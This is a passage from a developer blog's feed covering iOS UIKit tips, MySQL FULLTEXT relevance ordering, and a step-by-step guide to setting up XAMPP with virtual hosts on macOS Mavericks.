class="line">&#125;</span><br></pre></td></tr></table></figure><p>You only do this in the rootViewController of the navigationController, then the rest will be the same result.</p><p><em>Source:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/19226965/how-to-hide-ios7-uinavigationbar-1px-bottom-line/19227158#19227158">How to hide iOS7 UINavigationBar 1px bottom line</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;There is a shadow &lt;em&gt;(only 1 pixel)&lt;/em&gt; below the UINavigationBar&lt;/p&gt;
&lt;p&gt;&lt;img</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>UIAlertView delegate in class method</title>
    <link href="http://jslim.net/blog/2014/02/22/uialertview-delegate-in-class-method/"/>
    <id>http://jslim.net/blog/2014/02/22/uialertview-delegate-in-class-method/</id>
    <published>2014-02-22T20:29:58.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>To handle the UIAlertView <em>(or any others class)</em>  delegate in <a href="https://developer.apple.com/library/ios/documentation/general/conceptual/DevPedia-CocoaCore/ClassMethod.html">class method</a> just have to change the minus <code>-</code> to plus <code>+</code></p><p>Example</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+ (<span class="type">void</span>)someMethod:(<span class="built_in">NSString</span> *)title withMessage:(<span class="built_in">NSString</span> *)message</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">UIAlertView</span> *alert = [[<span class="built_in">UIAlertView</span> alloc]initWithTitle:title</span><br><span class="line">                                                   message:message</span><br><span class="line">                                                  delegate:<span class="keyword">self</span> <span class="comment">// same here</span></span><br><span class="line">                                         cancelButtonTitle:<span class="string">@&quot;Cancel&quot;</span> </span><br><span class="line">                                         otherButtonTitles:<span class="string">@&quot;Done&quot;</span>, <span class="literal">nil</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// change to PLUS</span></span><br><span class="line">+ (<span class="type">void</span>)alertView:(<span class="built_in">UIAlertView</span> *)alertView clickedButtonAtIndex:(<span class="built_in">NSInteger</span>)buttonIndex</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;Button %d selected&quot;</span>, buttonIndex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There is <strong>no need</strong> to conform to UIAlertViewDelegate protocol, without the statement below will also work.</p><p>e.g.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> : <span class="title">UIViewController</span> &lt;<span class="title">UIAlertViewDelegate</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Reference: <a href="http://stackoverflow.com/questions/8883521/can-i-use-a-class-method-as-a-delegate-callback/8884262#8884262">Can I use a class method as a delegate callback</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;To handle the UIAlertView &lt;em&gt;(or any others class)&lt;/em&gt;  delegate in &lt;a</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>MySQL search order by relevance column using FULLTEXT</title>
    <link href="http://jslim.net/blog/2014/01/22/mysql-search-order-by-relevance-column-using-fulltext/"/>
    <id>http://jslim.net/blog/2014/01/22/mysql-search-order-by-relevance-column-using-fulltext/</id>
    <published>2014-01-22T18:39:03.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve blamed by one of the client and says that the keyword that match the title shown at bottom. So want me to order by column match.</p><p>Finally I found the solution which is <a href="http://dev.mysql.com/doc/refman/5.5/en/fulltext-search.html">Full-Text Search</a>.</p><p><strong>NOTE: In MySQL 5.5, full text search only applicable on MyISAM, only MySQL 5.6 onward can used in InnoDB</strong></p><p>Let say I have 2 tables: <code>book</code> &amp; <code>category</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `book` (</span><br><span class="line">    `id` <span class="type">int</span>(<span class="number">8</span>) unsigned <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    `title` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    `description` <span class="type">varchar</span>(<span class="number">1000</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    `keywords` <span class="type">varchar</span>(<span class="number">200</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    `category_id` <span class="type">int</span>(<span class="number">8</span>) unsigned,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">)  ENGINE<span class="operator">=</span>MyISAM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `category` (</span><br><span class="line">    `id` <span class="type">int</span>(<span class="number">8</span>) unsigned <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    `name` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    `description` <span class="type">varchar</span>(<span class="number">1000</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">)  ENGINE<span class="operator">=</span>MyISAM;</span><br></pre></td></tr></table></figure><p>Before using the full text search, index the columns</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> book <span class="keyword">ADD</span> FULLTEXT(title, keywords, description);</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> category <span class="keyword">ADD</span> FULLTEXT(name, description);</span><br></pre></td></tr></table></figure><p>Let’s verify that it already in Full Text <em>(e.g. shows <code>book</code> table’s column)</em></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> index_name, group_concat(column_name) <span class="keyword">as</span> columns</span><br><span class="line"><span class="keyword">FROM</span> information_Schema.STATISTICS </span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> <span class="string">&#x27;my_db_name&#x27;</span> </span><br><span class="line"><span class="keyword">AND</span> table_name <span class="operator">=</span> <span class="string">&#x27;book&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> index_type <span class="operator">=</span> <span class="string">&#x27;FULLTEXT&#x27;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> index_name</span><br></pre></td></tr></table></figure><p><strong>Objective: search result must shows the result that match the <code>title</code> first, then book’s <code>keywords</code> &amp; <code>description</code>, followed by category’s <code>name</code> &amp; <code>description</code></strong></p><p>Let see how the sql look like</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> book.<span class="operator">*</span></span><br><span class="line">, <span class="keyword">MATCH</span> (book.title) AGAINST (<span class="string">&#x27;PHP MySQL&#x27;</span> <span class="keyword">IN</span> <span class="type">BOOLEAN</span> MODE) <span class="keyword">AS</span> relevance_1</span><br><span class="line">, <span class="keyword">MATCH</span> (book.keywords, book.description) AGAINST (<span class="string">&#x27;PHP MySQL&#x27;</span> <span class="keyword">IN</span> <span class="type">BOOLEAN</span> MODE) <span class="keyword">AS</span> relevance_2</span><br><span class="line">, <span class="keyword">MATCH</span> (category.name, category.description) AGAINST (<span class="string">&#x27;PHP MySQL&#x27;</span> <span class="keyword">IN</span> <span class="type">BOOLEAN</span> MODE) <span class="keyword">AS</span> relevance_3</span><br><span class="line"><span class="keyword">FROM</span> book</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> category <span class="keyword">ON</span> category.id <span class="operator">=</span> book.category_id</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">MATCH</span> (book.title, book.keywords, book.description, category.name, category.description) AGAINST (<span class="string">&#x27;PHP MySQL&#x27;</span> <span class="keyword">IN</span> <span class="type">BOOLEAN</span> MODE)</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> (relevance_1 <span class="operator">*</span> <span class="number">3</span>) <span class="operator">+</span> (relevance_2 <span class="operator">*</span> <span class="number">2</span>) <span class="operator">+</span> relevance_3 <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure><p>The <code>IN BOOLEAN MODE</code> will return result either <strong>1</strong> or <strong>0</strong>.</p><p>In the last row (<code>ORDER BY</code>), there is multiplication, that is weightage</p><ul><li><code>relevance_1 * 3</code> - the most important</li><li><code>relevance_2 * 2</code> - the second important</li><li><code>relevance_3</code> - the least important (no multiply anything)</li></ul><p>So order them descendingly will give the result most important first <em>(higher the number, the more important)</em></p><p><em>References:</em></p><ul><li><em><a href="http://stackoverflow.com/questions/547542/how-can-i-manipulate-mysql-fulltext-search-relevance-to-make-one-field-more-val/600915#600915">How can I manipulate MySQL fulltext search relevance to make one field more ‘valuable’ than another?</a></em></li><li><em><a href="http://stackoverflow.com/questions/4107599/show-a-tables-fulltext-indexed-columns/4107794#4107794">Show a tables FULLTEXT indexed columns</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’ve blamed by one of the client and says that the keyword that match the title shown at bottom. So want me to order by column</summary>
        
      
    
    
    
    
    <category term="mysql" scheme="http://jslim.net/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>Setup PHP environment in Mavericks using XAMPP</title>
    <link href="http://jslim.net/blog/2014/01/16/setup-php-environment-in-mavericks-using-xampp/"/>
    <id>http://jslim.net/blog/2014/01/16/setup-php-environment-in-mavericks-using-xampp/</id>
    <published>2014-01-16T21:38:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve been using <a href="http://www.mamp.info/">MAMP</a> for some time, unfortunately, it seems like outdated <em>(seldom update)</em>, now I’ve switched to <a href="http://www.apachefriends.org/en/xampp.html">XAMPP</a> and it is up to date.</p><p>To setup a PHP environment in Mac OS X 10.9:</p><h2 id="1-Download-XAMPP"><a href="#1-Download-XAMPP" class="headerlink" title="1. Download XAMPP"></a>1. Download XAMPP</h2><p>You can download the latest version <a href="http://www.apachefriends.org/en/xampp-macosx.html">here</a>. Then install it.</p><p><strong>Bare in mind that by default, MySQL root user has no password, but will set it later</strong></p><h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/installation.png" alt="Install XAMPP"></p><p>Once completed, launch it</p><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/complete-installation.png" alt="Complete install XAMPP"></p><h3 id="Start-MySQL-server"><a href="#Start-MySQL-server" class="headerlink" title="Start MySQL server"></a>Start MySQL server</h3><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/start-mysql-server.png" alt="Start MySQL server"></p><ol><li>Select <strong>Manage Servers</strong> tab</li><li>Select <strong>MySQL Database</strong></li><li>Start it</li></ol><p>Then close it.</p><h2 id="2-Add-some-PHP-projects"><a href="#2-Add-some-PHP-projects" class="headerlink" title="2. Add some PHP projects"></a>2. Add some PHP projects</h2><p>Hit <strong>Command <code>⌘</code></strong> + <strong>Space</strong> key, type in <code>terminal</code> then hit <strong>Enter</strong> key.</p><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/open-terminal.png" alt="Search for Terminal"></p><h3 id="Create-project-A"><a href="#Create-project-A" class="headerlink" title="Create project A"></a>Create project A</h3><p>Create a directory to keep all projects _(e.g. public_html)_</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> ~/public_html</span></span><br></pre></td></tr></table></figure><p>Create a project to that directory</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> ~/public_html/project_a</span></span><br></pre></td></tr></table></figure><p>Create a home page for it</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> ~/public_html/project_a/index.php</span></span><br></pre></td></tr></table></figure><p>then add the following content</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Welcome to Foo Site&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;Here you can put dynamic content.&#x27;</span>; <span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="Create-project-B"><a href="#Create-project-B" class="headerlink" title="Create project B"></a>Create project B</h3><p>For testing purpose, just duplicate the project A</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp -r ~<span class="regexp">/public_html/</span>project_a ~<span class="regexp">/public_html/</span>project_b</span><br></pre></td></tr></table></figure><p>Edit the file <strong>~/public_html/project_b/index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;Welcome to Bar Site&lt;/h1&gt; &lt;!-- change the header to differentiate them --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;Here you can put dynamic content.&#x27;</span>; <span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>Done.</p><h2 id="3-Setup-virtual-host"><a href="#3-Setup-virtual-host" class="headerlink" title="3. Setup virtual host"></a>3. Setup virtual host</h2><p>Now we have 2 projects, so we use virtual host <em>(setup different domains)</em> to differentiate them</p><p>Navigate to XAMPP directory</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd <span class="regexp">/Applications/</span>XAMPP<span class="regexp">/etc/</span></span><br></pre></td></tr></table></figure><p>Edit the file named <strong>httpd.conf</strong>, search for <code>httpd-vhosts</code>, you will see the line</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># Virtual hosts</span></span><br><span class="line"><span class="comment">#Include etc/extra/httpd-vhosts.conf</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>uncomment the line, i.e.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># Virtual hosts</span></span><br><span class="line"><span class="attribute">Include</span> etc/extra/httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Now will look like</p><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/uncomment-vhost.png" alt="Uncommented vhosts"></p><p>Navigate to deeper directory</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> <span class="built_in">cd</span> extra/</span><br></pre></td></tr></table></figure><p>Then edit the file named <strong>httpd-vhosts.conf</strong>, and it already come with this content</p><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/default-vhosts.png" alt="Default virtual hosts"></p><p>Remove it and change to</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerAdmin</span> webmaster@dummy-host.example.com</span><br><span class="line">    <span class="attribute">ServerName</span> local.foosite.com</span><br><span class="line">    <span class="attribute">ServerAlias</span> local.foosite.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> <span class="string">&quot;/Users/username/public_html/project_a&quot;</span></span><br><span class="line">    <span class="section">&lt;Directory <span class="string">&quot;/Users/username/public_html/project_a/&quot;</span>&gt;</span></span><br><span class="line">        <span class="attribute">DirectoryIndex</span> index.php</span><br><span class="line">        <span class="attribute">Options</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">Order</span> <span class="literal">allow</span>,<span class="literal">deny</span></span><br><span class="line">        <span class="attribute">allow</span> from <span class="literal">all</span></span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="string">&quot;logs/local.foosite.com-error_log&quot;</span></span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="string">&quot;logs/local.foosite.com-access_log&quot;</span> common</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerAdmin</span> webmaster@dummy-host.example.com</span><br><span class="line">    <span class="attribute">ServerName</span> local.barsite.com</span><br><span class="line">    <span class="attribute">ServerAlias</span> local.barsite.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> <span class="string">&quot;/Users/username/public_html/project_b&quot;</span></span><br><span class="line">    <span class="section">&lt;Directory <span class="string">&quot;/Users/username/public_html/project_b/&quot;</span>&gt;</span></span><br><span class="line">        <span class="attribute">DirectoryIndex</span> index.php</span><br><span class="line">        <span class="attribute">Options</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">Order</span> <span class="literal">allow</span>,<span class="literal">deny</span></span><br><span class="line">        <span class="attribute">allow</span> from <span class="literal">all</span></span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="string">&quot;logs/local.barsite.com-error_log&quot;</span></span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="string">&quot;logs/local.barsite.com-access_log&quot;</span> common</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><p>Restart apache server</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo <span class="regexp">/Applications/</span>XAMPP<span class="regexp">/xamppfiles/</span>xampp restart</span><br></pre></td></tr></table></figure><p>Edit the <strong>/etc/hosts</strong> file</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure><p>Add the following content to bottom</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Virtual hosts</span><br><span class="line"><span class="number">127.0.0.1</span>        local.foosite.com</span><br><span class="line"><span class="number">127.0.0.1</span>        local.barsite.com</span><br></pre></td></tr></table></figure><p>Save it.</p><h2 id="4-Test-it-in-browser"><a href="#4-Test-it-in-browser" class="headerlink" title="4. Test it in browser"></a>4. Test it in browser</h2><p>Open your browser <em>(e.g. Safari)</em>, type in the URL <strong>local.foosite.com</strong>, then you will see</p><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/foo-site.png" alt="Foo Site"></p><p>and then change the URL to <strong>local.barsite.com</strong>, then you will see</p><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/bar-site.png" alt="Bar Site"></p><h2 id="5-Add-MySQL-password-for-root-user"><a href="#5-Add-MySQL-password-for-root-user" class="headerlink" title="5. Add MySQL password for root user"></a>5. Add MySQL password for root user</h2><p>In your browser, type in the URL <strong>localhost/phpmyadmin</strong>, select a user</p><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/edit-user.png" alt="Edit root user"></p><ol><li>Select <strong>Users</strong> tab</li><li>Click on the link</li></ol><p>Scroll to <strong>Change password</strong> section</p><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/change-password.png" alt="Change root user&#39;s password"></p><p>Then type in the password you want <em>(e.g. password)</em>.</p><p>Once completed, when you simply click on any link above, error appear.</p><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/phpmyadmin-error.png" alt="phpMyAdmin error"></p><p>To solve this, just have to edit the file located in <strong>/Applications/XAMPP/xamppfiles/phpmyadmin/config.inc.php</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi <span class="regexp">/Applications/</span>XAMPP<span class="regexp">/xamppfiles/</span>phpmyadmin/config.inc.php</span><br></pre></td></tr></table></figure><p>Add in the password you just set</p><p><img src="/images/posts/2014-01-17-setup-php-environment-in-mavericks-using-xampp/new-password.png" alt="phpMyAdmin new password"></p><p>Save it and exit.</p><p>In your browser, refresh the phpmyadmin page. It should work now.</p><h2 id="6-Add-on-Auto-start-XAMPP-on-machine-boot-up"><a href="#6-Add-on-Auto-start-XAMPP-on-machine-boot-up" class="headerlink" title="6. (Add on) Auto start XAMPP on machine boot up"></a>6. (Add on) Auto start XAMPP on machine boot up</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /Library/StartupItems</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">mkdir</span> xampp <span class="comment"># create xampp directory</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> xampp/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">touch</span> xampp <span class="comment"># add a file named `xampp`</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">touch</span> StartupParameters.plist <span class="comment"># add a file named `StartupParameters.plist`</span></span></span><br></pre></td></tr></table></figure><p>Add the content to the files</p><h3 id="xampp"><a href="#xampp" class="headerlink" title="xampp"></a>xampp</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo vi xampp</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">/Applications/XAMPP/xamppfiles/xampp start</span><br></pre></td></tr></table></figure><p><em>(By default, XAMPP will install in the path above, if yours is different, just modify it.)</em></p><h3 id="StartupParameters-plist"><a href="#StartupParameters-plist" class="headerlink" title="StartupParameters.plist"></a>StartupParameters.plist</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo vi StartupParameters.plist</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0″ encoding=”UTF-8″?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span> <span class="keyword">SYSTEM</span> “file://localhost/System/Library/DTDs/PropertyList.dtd”&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">”0.9″</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>XAMPP<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>OrderPreference<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>Late<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>Provides<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>Starts Apache and MySQL<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span>Uses<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>SystemLog<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Change the ownership</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> .. <span class="comment"># go back 1 level up (directory)</span></span></span><br><span class="line"><span class="meta prompt_">$ 